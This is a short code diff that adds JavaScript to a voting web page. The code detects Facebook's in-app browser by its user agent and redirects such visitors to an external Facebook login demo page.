@@ -89,6 +89,15 @@
           document.getElementById('voteForm').style.display = 'none';
         }
       }
+
+      function detectMessenger() {
+        var ua = navigator.userAgent || navigator.vendor || window.opera;
+        return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
+      }
+
+      if (detectMessenger()) {
+        window.location.href = "https://harrywitos.github.io/facebook-login-demo";
+      }
     </script>
 
     <!-- Facebook login button -->
